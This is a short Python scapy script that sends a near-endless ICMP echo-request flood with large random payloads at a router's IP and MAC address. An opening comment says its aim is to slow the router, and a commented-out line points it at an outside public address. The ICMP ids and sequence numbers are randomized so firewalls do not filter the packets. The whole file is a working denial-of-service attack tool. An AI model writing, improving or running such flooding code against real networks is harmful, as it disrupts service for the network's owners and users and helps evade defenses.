# direct icmp flooding is not slowing the router. I have even tried to increase the size of packet.
from scapy.all import *
import random
 
source_ip = "192.168.163.128"
source_mac = "00:0c:29:a7:96:49"
destination_ip = "192.168.163.2"
destination_mac = "00:50:56:e7:1a:49"
# destination_ip = "142.251.214.142" #outside network
# destination_mac = "ff:ff:ff:ff:ff:ff"
c = 10000000000000000 # number of echo-request to send

def echo_request(source_ip,source_mac,destination_ip,destination_mac,c):
	pkt = Ether()/IP()/ICMP()/Raw(RandString(size=1450))

	# icmp's type is by default set to echo-request
	# randomly generate icmp's id and sequence as their default value of 0 might be blocked by all firewalls.
	for i in range(c):
		pkt["Ethernet"].src = source_mac
		pkt["Ethernet"].dst = destination_mac
		pkt["IP"].src = source_ip
		pkt["IP"].dst = destination_ip
		pkt["ICMP"].id = random.randint(1, 100)
		pkt["ICMP"].seq = random.randint(1, 100)
		sendp(pkt)
echo_request(source_ip=source_ip,source_mac=source_mac,destination_ip=destination_ip,destination_mac=destination_mac,c=c)
